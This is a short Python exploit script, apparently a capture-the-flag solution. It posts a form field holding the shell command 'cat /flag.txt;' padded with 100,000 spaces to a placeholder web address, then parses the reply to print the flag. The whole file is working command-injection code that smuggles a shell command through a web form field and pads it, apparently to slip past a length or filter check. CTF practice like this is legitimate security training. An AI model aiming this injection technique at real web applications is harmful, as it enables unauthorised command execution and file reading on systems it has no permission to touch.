import requests
cmd = "ls"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
data = {'cmd': f'cat /flag.txt; '+' '*100000}
response = requests.post('http://[url here]/', headers=headers, data=data)
print(response.text.split("<br>")[-1].split("</div>")[0])